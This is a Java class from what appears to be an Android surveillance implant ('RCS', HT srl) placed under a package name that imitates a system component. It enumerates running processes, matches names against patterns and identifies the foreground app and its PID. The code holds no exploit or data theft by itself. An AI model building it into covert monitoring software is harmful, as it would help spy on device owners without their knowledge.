/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : RunningProcesses.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo;

import java.util.ArrayList;
import java.util.Iterator;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;

public class RunningProcesses {
	private static final String TAG = "RunningProcess"; //$NON-NLS-1$

	private ArrayList<ActivityManager.RunningAppProcessInfo> list;
	private final ActivityManager activityManager;
	private long time;

	public RunningProcesses() {
		activityManager = (ActivityManager) Status.getAppContext().getSystemService(Context.ACTIVITY_SERVICE);
	}

	private void clear() {
		if (list != null) {
			list.clear();
		}
	}

	public void update() {
		if (Cfg.DEBUG) {
			Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$
		}

		clear();

		list = (ArrayList<ActivityManager.RunningAppProcessInfo>) activityManager.getRunningAppProcesses();
		time = System.currentTimeMillis();
	}

	// DEBUG
	public void print() {
		if (list == null || list.size() == 0) {
			return;
		}

		final Iterator<ActivityManager.RunningAppProcessInfo> iter = list.listIterator();

		while (iter.hasNext()) {
			final ActivityManager.RunningAppProcessInfo element = iter.next();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (update) proc: " + element.processName); //$NON-NLS-1$
			}
		}
	}

	public synchronized boolean isPresent(String process) {

		if (list == null || list.size() == 0) {
			return false;
		}
		
		if (process.length() == 0) {
			return false;
		}

		for(RunningAppProcessInfo appProcess : list){
			if (StringUtils.matchStar(process, appProcess.processName) == true) {
				return true;
			}
		}

		return false;
	}

	public synchronized ArrayList<ActivityManager.RunningAppProcessInfo> getProcessList() {
		return list;
	}
	
	public RunningAppProcessInfo getForeground() {		
		RunningAppProcessInfo ret = null;
		
		if (list == null || list.size() == 0) {
			update();
		}
		
		for (RunningAppProcessInfo appProcess : list) {
		    if (appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
		    	if (Cfg.DEBUG) {
					Check.log(TAG + " (getForeground): " + appProcess.processName + " pid: " + appProcess.pid);
				}
		    	
		    	ret = appProcess;
		    }
		}
		
		return ret;
	}
	
	public int getForegroundDigest() {		
		int ret = 0;
		
		if (list == null || list.size() == 0) {
			update();
		}
		
		for (RunningAppProcessInfo appProcess : list) {
		    if (appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
		    	if (Cfg.DEBUG) {
					//Check.log(TAG + " (getForeground): " + appProcess.processName + " pid: " + appProcess.pid);
				}
		    	
		    	ret += appProcess.pid;
		    }
		}
		
		return ret;
	}

	public int getForegroundPid() {
		if (list == null || list.size() == 0) {
			update();
		}

		for(RunningAppProcessInfo appProcess : list){
		    if(appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND){
		        return appProcess.pid;
		    }
		}
		return 0;
	}
	
	public int getProcessPid(String p) {
		if (list == null || list.size() == 0) {
			update();
		}

		for (RunningAppProcessInfo appProcess : list){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getProcessPid): " + appProcess.processName);
			}
		    if (appProcess.processName.contains(p)){
		        return appProcess.pid;
		    }
		}
		return 0;
	}
}
